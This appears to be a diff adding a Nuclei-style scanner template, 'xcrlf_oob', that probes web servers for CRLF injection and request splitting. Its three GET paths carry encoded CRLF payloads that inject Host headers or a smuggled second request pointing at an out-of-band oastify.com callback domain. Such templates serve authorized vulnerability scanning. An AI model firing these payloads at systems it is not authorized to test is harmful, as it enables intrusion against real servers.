@@ -1,0 +1,18 @@
+id: xcrlf_oob
+info:
+  name: xcrlf_oob
+  author: raff
+  severity: high
+  description: xcrlf
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/%20HTTP/1.1%0d%0aHost:%20{{Hostname}}.fj2ka3tgps1ottgttm73rlgy3p9ix8lx.oastify.com%0d%0a%0d%0a"
+      - "{{BaseURL}}/%20HTTP/1.1%0d%0aHost:%20{{Hostname}}%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aHost:%20{{Hostname}}.fj2ka3tgps1ottgttm73rlgy3p9ix8lx.oastify.com%0d%0aX:"
+      - "{{BaseURL}}/%20HTTP/1.1%0d%0aHost:%20{{Hostname}}%0d%0a%0d%0aGET%20http://{{Hostname}}.fj2ka3tgps1ottgttm73rlgy3p9ix8lx.oastify.com%20HTTP/1.1%0d%0aX:"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "xjbb5o44okxfs5l69caz5fzjlgigz"
